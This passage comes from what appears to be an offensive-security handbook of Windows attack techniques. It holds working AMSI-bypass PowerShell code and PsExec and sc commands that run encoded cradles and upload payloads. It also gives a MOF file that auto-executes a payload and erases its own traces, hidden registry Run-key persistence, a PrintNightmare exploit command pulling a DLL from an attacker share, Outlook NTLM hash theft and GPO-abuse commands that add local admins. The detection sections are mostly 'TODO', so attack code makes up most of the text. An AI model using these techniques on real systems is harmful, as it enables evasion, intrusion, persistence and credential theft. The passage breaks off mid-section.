<p>Windows Defender (or another AV that implements AMSI) must be running and must be active. Further, the ability to execute powershell against the target is required.</p>
<h2 id="setup-12"><a class="header" href="#setup-12">Setup</a></h2>
<p>N/A</p>
<h2 id="execution-12"><a class="header" href="#execution-12">Execution</a></h2>
<h3 id="method-1---nulling-the-amsi-context"><a class="header" href="#method-1---nulling-the-amsi-context">Method 1 - Nulling the AMSI Context</a></h3>
<p>This method is used to null out the pointer that AMSI uses to keep track of its current context. Instead of crashing the process or preventing any command from being executed, all commands will be allowed to execute even if they are malicious. This technique can be done from powershell itself, and needs no external utility.</p>
<p>Use the following powershell code to bypass AMSI:</p>
<pre><code class="language-powershell">foreach($x in [Ref].Assembly.GetTypes()){if($x.Name -like '*iUtils'){$a=$x}}
foreach($x in $a.GetFields('NonPublic,Static')){if($x.Name -like '*Context'){$c=$x}}
[IntPtr]$ptr=$c.GetValue($null)
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
</code></pre>
<p>Now the 'amsiutils' test string should not trigger defender:</p>
<p><img src="./images/Pasted%20image%2020230707132744.png" alt="Bypass AMSI" /></p>
<h4 id="indicators-of-compromise-18"><a class="header" href="#indicators-of-compromise-18">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-2---telling-amsi-that-init-failed"><a class="header" href="#method-2---telling-amsi-that-init-failed">Method 2 - Telling AMSI that init Failed</a></h3>
<p>Similar to method 1, only powershell is needed for this technique. Instead of corrupting the AMSI context pointer, it's possible to convince AMSI that it's initialization failed.</p>
<p>Use the following powershell to bypass AMSI:</p>
<pre><code class="language-powershell">foreach($x in [Ref].Assembly.GetTypes()){if($x.Name -like '*iUtils'){$a=$x}}
foreach($x in $a.GetFields('NonPublic,Static')){if($x.Name -like '*iInitFailed'){$i=$x}}
$i.SetValue($null, $true)
</code></pre>
<p>Now the 'amsiutils' test string should not trigger defender:</p>
<p><img src="./images/Pasted%20image%2020230707133543.png" alt="Bypass AMSI via Init" /></p>
<h4 id="indicators-of-compromise-19"><a class="header" href="#indicators-of-compromise-19">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-stealth"><a class="header" href="#windows-stealth">Windows Stealth</a></h1>
<ul>
<li><a href="./windows_reflective_pe_loader.html">Reflective PE Loader</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-reflective-pe-loader"><a class="header" href="#windows-reflective-pe-loader">Windows Reflective PE Loader</a></h1>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-lateral-movement"><a class="header" href="#windows-lateral-movement">Windows Lateral Movement</a></h1>
<ul>
<li><a href="./psexec.html">PsExec</a></li>
<li><a href="./mof_upload.html">MOF Upload</a></li>
<li><a href="./winrm.html">WinRM</a></li>
<li><a href="./printnightmare.html">PrintNightmare (CVE-2021-1675)</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="psexec"><a class="header" href="#psexec">PsExec</a></h1>
<h2 id="summary-13"><a class="header" href="#summary-13">Summary</a></h2>
<p>PsExec is a light-weight telnet-replacement that lets you execute processes on other Windows systems, complete with full interactivity for console applications, without having to manually install client software.</p>
<h2 id="prerequisites-13"><a class="header" href="#prerequisites-13">Prerequisites</a></h2>
<p>The target must be a Windows based operating system, and the C$ or ADMIN$ share (or equivalent share into C:\Windows\System32) must be <em>writable</em>. If a network share is not available, see <a href="./mof_upload.html">MOF Upload</a>, an alternative to PsExec.</p>
<h2 id="setup-13"><a class="header" href="#setup-13">Setup</a></h2>
<p>To set up, either obtain and utilize Administrator credentials to the share(s) in question, or make them writable by modifying user permissions in the Sharing tab on windows. To create a user that can access C$ or ADMIN$, use the following command as Administrator:</p>
<pre><code class="language-cmd">net user kevin.beacon securepassword /add
net localgroup Administrators kevin.beacon /add
</code></pre>
<p>If within an active directory environment, you may add the user to either &quot;Domain Admins&quot; for the current tree in the forest, or &quot;Enterprise Admins&quot; for the entire forest.</p>
<pre><code class="language-cmd">net group &quot;Domain Admins&quot; kevin.beacon /add /domain
net group &quot;Enterprise Admins&quot; kevin.beacon /add /domain
</code></pre>
<h2 id="execution-13"><a class="header" href="#execution-13">Execution</a></h2>
<h3 id="method-1---sysinternals"><a class="header" href="#method-1---sysinternals">Method 1 - Sysinternals</a></h3>
<p>From a Windows client, the <a href="https://learn.microsoft.com/en-us/sysinternals/">Sysinternals</a> suite can be used to execute arbitrary programs on the target machine. Use <code>-s</code> to run the command as NT AUTHORITY\SYSTEM, and use <code>-i</code> to make it interactive, though this will almost certainly break in a reverse shell. Though, using this flag also gives some useful output even when spawning a reverse shell through PsExec, which is why it is listed below.</p>
<pre><code class="language-cmd">.\psexec.exe -accepteula -u user -p password -s -i \\remote.server.com cmd /c %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -enc &lt;base64 encoded cradle&gt;
</code></pre>
<h4 id="indicators-of-compromise-20"><a class="header" href="#indicators-of-compromise-20">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-2---manually-psexecing-with-sc"><a class="header" href="#method-2---manually-psexecing-with-sc">Method 2 - Manually PsExecing with SC</a></h3>
<p>From a Windows client, upload the binary you wish to execute on the target and start a remote service with the following commands (there is supposed to be a space after binPath):</p>
<pre><code class="language-cmd">copy payload.exe \\remote.server.com\ADMIN$
sc \\remote.server.com create servicename binPath= &quot;C:\Windows\payload.exe&quot;
sc \\remote.server.com start servicename
</code></pre>
<h4 id="indicators-of-compromise-21"><a class="header" href="#indicators-of-compromise-21">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-3---impacket-psexec"><a class="header" href="#method-3---impacket-psexec">Method 3 - Impacket-PsExec</a></h3>
<p>The impacket library was created in python, so as long as python and impacket are installed, this should work from any OS that supports python.</p>
<pre><code class="language-bash">impacket-psexec DOMAIN/USERNAME:'PASSWORD'@target
</code></pre>
<p>If you do not have or know the password, but you do have the NTLM hash, then impacket also supports Pass The Hash (Only place the part of the hash after the colon in this command):</p>
<pre><code class="language-bash">impacket-psexec -hashes :NTHASH DOMAIN/USERNAME@target
</code></pre>
<h4 id="indicators-of-compromise-22"><a class="header" href="#indicators-of-compromise-22">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mof-upload"><a class="header" href="#mof-upload">MOF Upload</a></h1>
<h2 id="summary-14"><a class="header" href="#summary-14">Summary</a></h2>
<p>Pre-Windows Vista (Not including vista) have an interesting vulnerability that can be used to gain code execution when two files are written to specific directories using any method. There might be a way of using this Post-Windows Vista, but they don't get auto-compiled anymore. More research is needed.</p>
<h2 id="prerequisites-14"><a class="header" href="#prerequisites-14">Prerequisites</a></h2>
<p>A Pre-Windows Vista install is required, and some method of writing to both &quot;C:\Windows\System32&quot; and &quot;C:\Windows\System32\wbem\mof&quot; is required for this exploit.</p>
<h2 id="setup-14"><a class="header" href="#setup-14">Setup</a></h2>
<p>Pick any method of allowing the attacker to write to the &quot;C:\Windows\System32&quot; and &quot;C:\Windows\System32\wbem\mof&quot; folders. This exploit can be used as privilege escalation or as initial access. SMB, TFTP, FTP, etc, are all viable setups.</p>
<h2 id="execution-14"><a class="header" href="#execution-14">Execution</a></h2>
<h3 id="method-1---auto-compiling-mof"><a class="header" href="#method-1---auto-compiling-mof">Method 1 - Auto-compiling MOF</a></h3>
<p>The first step is to upload the intended binary to &quot;C:\Windows\System32&quot;, and then to upload a custom MOF file to &quot;C:\Windows\System32\wbem\mof&quot;. Replace any instance of &quot;payload.exe&quot; below with the name of the executable uploaded. Below is the file that should be uploaded to the MOF directory:</p>
<pre><code class="language-mof">#pragma namespace(&quot;\\\\.\\root\\cimv2&quot;)
class MyClass89
{
	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
	[key] string Name;
	[not_null] string ScriptingEngine;
	string ScriptFileName;
	[template] string ScriptText;
	uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
	Name  = &quot;ActiveScriptEventConsumer&quot;;
	CLSID = &quot;{266c72e7-62e8-11d1-ad89-00c04fd8fdff}&quot;;
	PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
	Provider = $P;
	ConsumerClassNames = {&quot;ActiveScriptEventConsumer&quot;};
};
Instance of ActiveScriptEventConsumer as $cons
{
	Name = &quot;ASEC&quot;;
	ScriptingEngine = &quot;JScript&quot;;
	ScriptText = &quot;\ntry {var s = new ActiveXObject(\&quot;Wscript.Shell\&quot;);\ns.Run(\&quot;payload.exe\&quot;);} catch (err) {};\nsv = GetObject(\&quot;winmgmts:root\\\\cimv2\&quot;);try {sv.Delete(\&quot;MyClass89\&quot;);} catch (err) {};try {sv.Delete(\&quot;__EventFilter.Name='instfilt'\&quot;);} catch (err) {};try {sv.Delete(\&quot;ActiveScriptEventConsumer.Name='ASEC'\&quot;);} catch(err) {};&quot;;
	
};
Instance of ActiveScriptEventConsumer as $cons2
{
	Name = &quot;qndASEC&quot;;
	ScriptingEngine = &quot;JScript&quot;;
	ScriptText = &quot;\nvar objfs = new ActiveXObject(\&quot;Scripting.FileSystemObject\&quot;);\ntry {var f1 = objfs.GetFile(\&quot;wbem\\\\mof\\\\good\\\\baud.mof\&quot;);\nf1.Delete(true);} catch(err) {};\ntry {\nvar f2 = objfs.GetFile(\&quot;payload.exe\&quot;);\nf2.Delete(true);\nvar s = GetObject(\&quot;winmgmts:root\\\\cimv2\&quot;);s.Delete(\&quot;__EventFilter.Name='qndfilt'\&quot;);s.Delete(\&quot;ActiveScriptEventConsumer.Name='qndASEC'\&quot;);\n} catch(err) {};&quot;;
};
instance of __EventFilter as $Filt
{
	Name = &quot;instfilt&quot;;
	Query = &quot;SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \&quot;MyClass89\&quot;&quot;;
	QueryLanguage = &quot;WQL&quot;;
};
instance of __EventFilter as $Filt2
{
	Name = &quot;qndfilt&quot;;
	Query = &quot;SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \&quot;Win32_Process\&quot; AND TargetInstance.Name = \&quot;payload.exe\&quot;&quot;;
	QueryLanguage = &quot;WQL&quot;;
	
};
instance of __FilterToConsumerBinding as $bind
{
	Consumer = $cons;
	Filter = $Filt;
};
instance of __FilterToConsumerBinding as $bind2
{
	Consumer = $cons2;
	Filter = $Filt2;
};
instance of MyClass89 as $MyClass
{
	Name = &quot;ClassConsumer&quot;;
};
</code></pre>
<p>Once this file is uploaded, then the exe that was uploaded should get executed.</p>
<h4 id="indicators-of-compromise-23"><a class="header" href="#indicators-of-compromise-23">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="winrm"><a class="header" href="#winrm">WinRM</a></h1>
<h2 id="summary-15"><a class="header" href="#summary-15">Summary</a></h2>
<p>WinRM, or Windows Remote Management, is a feature that comes installed on all modern versions of Windows (Windows Server 2008/Windows 7 onwards) which allows remote administration between hosts. Usage of this service requires credentials or the NTLM hash of a user that has remote management permissions.</p>
<p>WinRM utilizes an API called wsman, which is built ontop of HTTP/S and operates on ports 5985 (HTTP) or 5986 (HTTPS) by default. Its legitimate use is comparable to psexec, and it can be used to perform administrative functions on remote hosts without the need for SSH or RDP. With the addition of PowerShell to the Windows ecosystem, it also goes by the name PowerShell Remoting, though these commands are just wrappers around WinRM.</p>
<h2 id="prerequisites-15"><a class="header" href="#prerequisites-15">Prerequisites</a></h2>
<p>WinRM may require configuration to work, and the target user must have the &quot;Remote Management User&quot; permissions. Unless permissions are applied via group policy, users must be added to the &quot;Remote Management Users&quot; localgroup on a per-machine basis. Adding that user to the domain group only grants WinRM access to the domain controller.</p>
<h2 id="setup-15"><a class="header" href="#setup-15">Setup</a></h2>
<p>To configure WinRM, run the following command as an administrator:</p>
<pre><code class="language-cmd">winrm quickconfig
</code></pre>
<p>Once WinRM has been successfully configured, add a user to the Remote Management User group using this command:</p>
<pre><code>net localgroup &quot;Remote Management Users&quot; username /add
</code></pre>
<h2 id="execution-15"><a class="header" href="#execution-15">Execution</a></h2>
<h3 id="method-1---evil-winrm"><a class="header" href="#method-1---evil-winrm">Method 1 - Evil-WinRM</a></h3>
<p>https://github.com/Hackplayers/evil-winrm</p>
<p>Evil-WinRM is a tool which wraps WinRM commands to give you an interactive shell on a target machine. Evil-WinRM is written in Ruby, and requires it to be installed to work. </p>
<p>Using the credentials of the user that has access to the WinRM service, run one of the following commands to obtain access to the target.</p>
<p>Connect to a host:</p>
<p><code>evil-winrm --ip &lt;target&gt; --user &lt;user&gt; --password &lt;password&gt;</code></p>
<p>Connect to a host, passing the hash instead of using a password:</p>
<p><code>evil-winrm --ip &lt;target&gt; --user &lt;user&gt; --hash &lt;nt_hash&gt;</code></p>
<h4 id="indicators-of-compromise-24"><a class="header" href="#indicators-of-compromise-24">Indicators of Compromise</a></h4>
<p>When connecting to a WinRM port, network traffic will show the upload of a &quot;wsman&quot; file to the target host over HTTP.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="printnightmare-cve-2021-1675"><a class="header" href="#printnightmare-cve-2021-1675">PrintNightmare (CVE-2021-1675)</a></h1>
<h2 id="summary-16"><a class="header" href="#summary-16">Summary</a></h2>
<p>PrintNightmare is a critical vulnerability that allows an attacker to obtain remote code execution and/or privilege escalation against any target Windows machine using the Spooler service that is enabled by default. While Microsoft has issued a patch for this vulnerability, if a few registry keys are present, then the target will still be vulnerable despite having the patch.</p>
<h2 id="prerequisites-16"><a class="header" href="#prerequisites-16">Prerequisites</a></h2>
<p>Either a Windows server that doesn't have the patch released on July 1st, 2021, or must have some special registry keys added. Further, some form of SMB server and a custom compiled DLL is required to exploit this vulnerability. This exploit requires credentials to operate, even a low-privilege user may work.</p>
<h2 id="setup-16"><a class="header" href="#setup-16">Setup</a></h2>
<p>Once the server is installed, and <em>if</em> the server contains the patch, then the following registry keys need to be installed:</p>
<pre><code class="language-registry">HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\RestrictDriverInstallationToAdministrators REG_DWORD 0x0
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall REG_DWORD 0x1
</code></pre>
<p><img src="./images/Pasted%20image%2020230606093107.png" alt="registry entries" /></p>
<h2 id="execution-16"><a class="header" href="#execution-16">Execution</a></h2>
<h3 id="method-1---cube0x0s-repo"><a class="header" href="#method-1---cube0x0s-repo">Method 1 - Cube0x0's Repo</a></h3>
<p>Clone <a href="https://github.com/cube0x0/CVE-2021-1675">Cube0x0's repo</a>, as well as <a href="https://github.com/NukingDragons/DllHijacks">this DLL repo</a>. Pick the DLL you want from the DLL repo and compile it on Windows, or using MinGW following the instructions in the README.</p>
<p>Once you have the DLL of choice compiled, and whatever listener/method of receiving or connecting to the shell configured, use impackets SMB server to host the file, and run the following commands:</p>
<pre><code class="language-bash">impacket-smbserver -smb2support share /path/to/folder/with/DLL
</code></pre>
<p>Finally, exploit the target:</p>
<pre><code class="language-bash">python3 CVE-2021-1675.py domain.com/username:'password'@target-ip '\\your-ip\share\your.dll'
</code></pre>
<p><img src="./images/Pasted%20image%2020230606100148.png" alt="successful connection" /></p>
<h4 id="indicators-of-compromise-25"><a class="header" href="#indicators-of-compromise-25">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-persistence"><a class="header" href="#windows-persistence">Windows Persistence</a></h1>
<ul>
<li><a href="./invisreg.html">Invisible Registry Keys</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="invisible-registry-keys"><a class="header" href="#invisible-registry-keys">Invisible Registry Keys</a></h1>
<h2 id="summary-17"><a class="header" href="#summary-17">Summary</a></h2>
<p>It's possible to craft invisible registry keys that the Windows NT kernel is able to read, but not any user-mode applications. This allows for some unique cases of persistence that is hard to detect from the defenders perspective.</p>
<h2 id="prerequisites-17"><a class="header" href="#prerequisites-17">Prerequisites</a></h2>
<p>The target must be windows, and you must run this tool with the appropriate access rights required for the hive you're trying to write to. HKLM requires Administrator/SYSTEM privileges, HKCU can be modified by the current user.</p>
<h2 id="setup-17"><a class="header" href="#setup-17">Setup</a></h2>
<p>This setup requires downloading and executing the following utility, defender may or may not catch this file on disk. Potentially use a <a href="./windows_reflective_pe_loader.html">reflective PE loader</a> to avoid this issue. The executable in question can be <a href="https://github.com/NukingDragons/invisreg">found at this repo</a>. Go to Releases and download the latest executable, compilation is not required.</p>
<h2 id="execution-17"><a class="header" href="#execution-17">Execution</a></h2>
<h3 id="method-1---invisregexe"><a class="header" href="#method-1---invisregexe">Method 1 - invisreg.exe</a></h3>
<p>Running invisreg.exe without any options will provide the following output:</p>
<pre><code class="language-help">Usage: invisreg [operation] [path] [type] [value]
       operations:
         create - Create a new invisible registry key
         edit   - Edit an existing invisible registry key
         delete - Delete an existing invisible registry key
         query  - Query an invisible registry key
       path:
         Like this - HKLM:\PATH\TO\KEY
         supported hives:
           HKLM        - HKEY_LOCAL_MACHINE
           HKCU or HCU - HKEY_CURRENT_USER
           HKCR        - HKEY_CLASSES_ROOT
           HKCC        - HKEY_CURRENT_CONFIG
           HKU         - HKEY_USERS
       type:
         REG_SZ        - Value is expected to be a string
         REG_DWORD     - Value is expected to be a 32-bit integer
         REG_QWORD     - Value is expected to be a 64-bit integer
         REG_BINARY    - Value is expected to be the name of a file
       value:
         ...

Examples:
       invisreg create HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName REG_SZ &quot;calc.exe&quot;
       invisreg edit HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName REG_DWORD 1337
       invisreg delete HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName
       invisreg query HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName
</code></pre>
<p>To install a powershell cradle into the run key for persistence, the following command can be used:</p>
<pre><code class="language-cmd">.\invisreg.exe create HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\Cradle REG_SZ &quot;powershell -enc &lt;base64&gt;&quot;
</code></pre>
<p>Or for a specific user:</p>
<pre><code class="language-cmd">.\invisreg.exe create HKCU:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\Cradle REG_SZ &quot;powershell -enc &lt;base64&gt;&quot;
</code></pre>
<h4 id="indicators-of-compromise-26"><a class="header" href="#indicators-of-compromise-26">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-privilege-escalation"><a class="header" href="#windows-privilege-escalation">Windows Privilege Escalation</a></h1>
<ul>
<li><a href="./cve-2023-23397.html">Outlook Client (CVE-2023-23397)</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="microsoft-outlook-client-appointment-reminder-alarm-sound---privilege-escalation-vulnerability-cve-2023-23397"><a class="header" href="#microsoft-outlook-client-appointment-reminder-alarm-sound---privilege-escalation-vulnerability-cve-2023-23397">Microsoft Outlook Client Appointment Reminder Alarm Sound - Privilege Escalation Vulnerability (CVE-2023-23397)</a></h1>
<h2 id="summary-18"><a class="header" href="#summary-18">Summary</a></h2>
<p>CVE-2023-23397 affects all versions of the Microsoft Outlook desktop applications on Windows systems. It is important to note that this vulnerability does not affect Outlook web app or Microsoft 365. The attacker can obtain a user's credentials and potentially escalate privileges by directing the Outlook client to <em><strong>search for the appointment reminder alarm sound on a specified UNC path, thereby leaking Net-NTLMv2 hashes</strong></em> when the victim machine authenticates to the server residing on the said UNC path. </p>
<p>Please refer to the <a href="https://www.cve.org/CVERecord?id=CVE-2023-23397">following</a> from CVE Records for which specific versions are vulnerable.</p>
<h2 id="prerequisites-18"><a class="header" href="#prerequisites-18">Prerequisites</a></h2>
<p>The prerequisite for the setup is to have a Windows Active Directory environment set up with an Exchange server, and host workstation(s) with Microsoft Outlook client software installed. </p>
<blockquote>
<p>The range for testing the Proof of Concept was set up using Windows Server 2019, Exchange 2019, and Outlook Client 2019 installed on Windows 10</p>
</blockquote>
<h2 id="setup-18"><a class="header" href="#setup-18">Setup</a></h2>
<p>First, install a Domain Controller. The instructions can be found <a href="https://www.virtualgyanis.com/post/step-by-step-how-to-install-and-configure-domain-controller-on-windows-server-2019">here.</a></p>
<p>Second, install Exchange.</p>
<ol>
<li>
<p>Download Exchange Server 2019 ISO from this <a href="https://www.microsoft.com/en-us/download/details.aspx?id=105713">link</a> on your Server 2019</p>
</li>
<li>
<p>In Server Manager click Add roles and features </p>
<ol>
<li>Click Next </li>
<li>Choose Role-based... and click Next </li>
<li>Click Next </li>
<li>Check AD LDS and click Next </li>
<li>Click Next until you have the option to install  </li>
<li>Check the Restart box and click Install </li>
<li>Click Close when it's available </li>
</ol>
</li>
<li>
<p>In Server Manager click on Tools and select AD LDS Setup Wizard </p>
<ol>
<li>Click Next for all defaults then click Finish </li>
</ol>
</li>
<li>
<p>Open PS as admin and run the following command </p>
<pre><code class="language-powershell">Install-WindowsFeature NET-Framework-45-Features, Server-Media-Foundation, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS
</code></pre>
</li>
<li>
<p>Install the prerequisites by following the instructions from this <a href="https://learn.microsoft.com/en-us/exchange/plan-and-deploy/prerequisites?view=exchserver-2019#exchange-2019-prerequisites-for-preparing-active-directory">link</a> and restart the box</p>
</li>
<li>
<p>Right-click on the Exchange Server 2019 ISO and select Mount</p>
</li>
<li>
<p>The new drive should open automatically, but open file explorer and open the DVD drive labeled ExchangeServer2019 if it doesn't open automatically.</p>
</li>
<li>
<p>Run Setup</p>
<ol>
<li>Select Don't check for updates right now and click next</li>
<li>Click next</li>
<li>Accept and click next</li>
<li>Select Use recommended settings and click next</li>
<li>Select Mailbox Role and Automatically... then click next</li>
<li>Click next</li>
<li>Enter an organization name of your choice and click next</li>
<li>Click next</li>
<li>If you installed all the prerequisites, the check should be successful. If it asks you to install additional features or packages, install them and continue</li>
<li>Click install, and the setup should take around 20 - 30 minutes</li>
<li>Click finish when complete and restart the box</li>
</ol>
</li>
<li>
<p>Test that the configuration is correct by sending e-mails internally</p>
<ol>
<li>Open a web browser and navigate to <code>https://ip-address-of-exchange-server-here/ecp</code></li>
<li>Login with your DC Admin credentials</li>
<li>Click the + sign and select User mailbox to create a user. You can create mailboxes for existing users in the domain, or vice versa -- you can create a new mailbox for a new user on the Exchange Server, which will create a user on the DC</li>
<li>Enter an Alias</li>
<li>Select New User and enter appropriate information in the fields</li>
<li>Click Browse under Organizational Unit and select Users, then click Save</li>
<li>Navigate to <code>https://ip-address-of-exchange-server-here/owa</code> and send a test e-mail to the new user.</li>
<li>Sign out from the Administrator, and sign back in as the newly created user to verify that the e-mails can be sent back and forth.</li>
</ol>
</li>
<li>
<p>Open Windows Firewall</p>
<ol>
<li>Create Inbound and Outbound rules that allow:
<ol>
<li>Ports 25, 389, 50636</li>
<li>ICMP (for debugging purposes, if needed)</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>Third, set up workstations with Outlook 2019 Clients.</p>
<ol>
<li>Join your workstation to the AD environment you set up above. <code>Note: Ensure that you assign a DNS server as the DC</code></li>
<li>Install Microsoft Office 2019
<ol>
<li>Microsoft Office 2019, as well as any activation needed can be found on this <a href="https://github.com/tylerdotrar/Activate-MicrosoftOffice">github repo</a></li>
<li>Upon opening Outlook, enter the e-mail address of the new account you created earlier, and click Advanced Options &gt; Let me set up my account manually &gt; Connect
<ol>
<li>Select Exchange (Not Exchange 2013 or earlier)</li>
</ol>
</li>
</ol>
</li>
<li>Make sure you can send and receive e-mails by communicating with the Exchange Server.</li>
</ol>
<h2 id="execution-18"><a class="header" href="#execution-18">Execution</a></h2>
<h3 id="method-1---powershell-script"><a class="header" href="#method-1---powershell-script">Method 1 - PowerShell Script</a></h3>
<p>The POC PowerShell script can be found <a href="https://github.com/ka7ana/CVE-2023-23397">here</a>. All that is required is that you change the recipient's e-mail address, and the UNC path</p>
<p><img src="./images/Pasted%20image%2020240118131309.png" alt="image" /></p>
<p><code>Note: The listening server doesn't necessarily need to be an SMB share. You can use things like Responder tool as well</code></p>
<h4 id="indicators-of-compromise-27"><a class="header" href="#indicators-of-compromise-27">Indicators of Compromise</a></h4>
<ul>
<li>PowerShell execution logs</li>
<li>NTLM hash traveling to an external network </li>
<li>Authentication request via UNC path</li>
</ul>
<h3 id="method-2---sending-appointments-on-outlook-client"><a class="header" href="#method-2---sending-appointments-on-outlook-client">Method 2 - Sending Appointments On Outlook Client</a></h3>
<ol>
<li>
<p>On the Outlook client, click New Items -&gt; Appointment 
<img src="./images/Pasted%20image%2020240118131751.png" alt="image" /></p>
</li>
<li>
<p>Manually select the sound file (to be played upon receiving the appointment reminder e-mail) and enter the UNC Path to the server </p>
<p><img src="./images/Pasted%20image%2020240118131906.png" alt="image" />
<img src="./images/Pasted%20image%2020240118132014.png" alt="image" /></p>
</li>
</ol>
<h4 id="indicators-of-compromise-28"><a class="header" href="#indicators-of-compromise-28">Indicators of Compromise</a></h4>
<ul>
<li>NTLM hash traveling to an external network </li>
<li>Authentication request via UNC path</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory"><a class="header" href="#active-directory">Active Directory</a></h1>
<ul>
<li><a href="./sharpgpoabuse.html">SharpGPOAbuse</a></li>
<li><a href="./cert_template_abuse.html">Certificate Template Abuse</a></li>
<li><a href="ACTIVE_DIRECTORY_VULNERABILITIES_SUMMARY.html">Vulnerabilities</a>
<ul>
<li><a href="./zerologon.html">Zerologon (CVE-2020-1472)</a></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sharpgpoabuse"><a class="header" href="#sharpgpoabuse">SharpGPOAbuse</a></h1>
<h2 id="summary-19"><a class="header" href="#summary-19">Summary</a></h2>
<p>SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. The original project hasn't been maintained in a couple of years, but <a href="https://github.com/NukingDragons/SharpGPOAbuse">this fork</a> extends the functionality. The &quot;Vulnerable GPO&quot; is simply the GPO that you wish to target, this can even be the default domain controller GPO that is automatically created on every DC.</p>
<h2 id="prerequisites-19"><a class="header" href="#prerequisites-19">Prerequisites</a></h2>
<p>In order to abuse GPO's, a configured Active Directory domain must be completely set up, and you must have access to a user that has privileges to modify GPO's. In order to modify a GPO, this utility relies on LDAP and SMB as well. This binary is also a PE executable, it expects to be ran on a Windows machine that's already been joined to the target domain controller.</p>
<h2 id="setup-19"><a class="header" href="#setup-19">Setup</a></h2>
<p>Download the <a href="https://github.com/NukingDragons/SharpGPOAbuse/releases">current release executable</a>, and either reflectively load or upload to a domain-joined Windows machine that you have access to.</p>
<h2 id="execution-19"><a class="header" href="#execution-19">Execution</a></h2>
<h3 id="method-1---adduserrights"><a class="header" href="#method-1---adduserrights">Method 1 - AddUserRights</a></h3>
<p>The following are the available options to add rights to a user account via GPO:</p>
<pre><code>Options required to add new user rights:
--UserRights
        Set the new rights to add to a user. This option is case sensitive and a comma separeted list must be used.
--UserAccount
        Set the account to add the new rights.
--GPOName
        The name of the vulnerable GPO.
</code></pre>
<p>This command will add the &quot;SeTakeOwnership&quot; and &quot;SeRemoteInteractiveLogonRight&quot; privileges to the bob.smith user account. </p>
<pre><code>SharpGPOAbuse.exe --AddUserRights --UserRights &quot;SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight&quot; --UserAccount bob.smith --GPOName &quot;Vulnerable GPO&quot;
</code></pre>
<h4 id="indicators-of-compromise-29"><a class="header" href="#indicators-of-compromise-29">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-2---addlocaladmin"><a class="header" href="#method-2---addlocaladmin">Method 2 - AddLocalAdmin</a></h3>
<p>The following are the available options to add a local admin via GPO:</p>
<pre><code>Options required to add a new local admin:
--UserAccount
        Set the name of the account to be added in local admins.
--GPOName
        The name of the vulnerable GPO.
</code></pre>
<p>The following will create a new local administrator account named &quot;bob.smith&quot;:</p>
<pre><code>SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName &quot;Vulnerable GPO&quot;
</code></pre>
<h4 id="indicators-of-compromise-30"><a class="header" href="#indicators-of-compromise-30">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-3---adduserscript--addcomputerscript"><a class="header" href="#method-3---adduserscript--addcomputerscript">Method 3 - AddUserScript / AddComputerScript</a></h3>
<p>The following are the available options to add a user or computer script via GPO:</p>
<pre><code>Options required to add a new user or computer startup script:
--ScriptName
        Set the name of the new startup script.
--ScriptContents
        Set the contents of the new startup script.
--GPOName
        The name of the vulnerable GPO.
</code></pre>
<p>The following will add a user script, this syntax also works with &quot;--AddComputerScript&quot;:</p>
